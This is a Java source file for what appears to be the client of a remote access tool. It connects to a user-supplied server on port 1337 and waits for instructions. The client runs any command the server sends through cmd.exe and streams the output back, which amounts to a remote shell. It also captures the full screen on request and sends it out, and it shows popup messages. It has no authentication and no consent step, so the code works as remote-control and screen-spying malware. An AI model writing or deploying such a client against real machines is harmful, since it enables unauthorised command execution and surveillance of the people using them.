import javax.swing.*;
import java.awt.*;
import java.awt.image.BufferedImage;
import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;

public class ClientController {
    private NetworkModel networkModel;

    public ClientController(NetworkModel networkModel) {
        this.networkModel = networkModel;

        String serverAddress = JOptionPane.showInputDialog("Server address", "localhost");
        this.networkModel.connect(serverAddress, 1337);
        System.out.println("Connected to server");

        startReceiving();
    }

    private void startReceiving() {
        while (networkModel.getSocket().isConnected()) {
            Parcel parcel = this.networkModel.receiveParcel();

            String type = parcel.getType();
            String feature = parcel.getFeature();
            Object payload = parcel.getPayload();

            System.out.println(type + " | " + feature + " | " + payload);

            switch (feature) {
                case "popup":
                    handlePopupParcel(payload);
                    break;
                case "terminal":
                    handleTerminalParcel(payload);
                    break;
                case "screen":
                    handleScreenParcel(payload);
                    break;
                default:
                    throw new IllegalArgumentException("'" + feature + "' is not a valid feature name");
            }
        }
    }

    private void handlePopupParcel(Object payload) {
        String[] payloadArray = (String[]) payload;
        JOptionPane.showMessageDialog(
                null, payloadArray[0], payloadArray[1], JOptionPane.INFORMATION_MESSAGE);
        try {
            networkModel.sendParcel("popup", "Popup closed at " + java.time.LocalDateTime.now());
        } catch (IOException e) {
            e.printStackTrace();
        }
    }

    private void handleTerminalParcel(Object payload) {
        String command = (String) payload;
        try {
            ProcessBuilder builder = new ProcessBuilder("cmd.exe", "/c", command);
            builder.redirectErrorStream(true);
            Process process = builder.start();

            InputStream stdout = process.getInputStream();
            BufferedReader reader = new BufferedReader(new InputStreamReader(stdout));

            String line;
            while ((line = reader.readLine()) != null) {
                networkModel.sendParcel("terminal", line);
            }
        } catch (IOException e) {
            e.printStackTrace();
        }
    }

    private void handleScreenParcel(Object payload) {
        BufferedImage bufferedImage;
        try {
            Robot robot = new Robot();
            Rectangle screenRect = new Rectangle(Toolkit.getDefaultToolkit().getScreenSize());
            bufferedImage = robot.createScreenCapture(screenRect);
        } catch (AWTException e) {
            e.printStackTrace();
            return;
        }

        ImageIcon imageIcon = new ImageIcon(bufferedImage);

        try {
            networkModel.sendParcel("screen", imageIcon);
        } catch (IOException e) {
            e.printStackTrace();
        }
    }
}
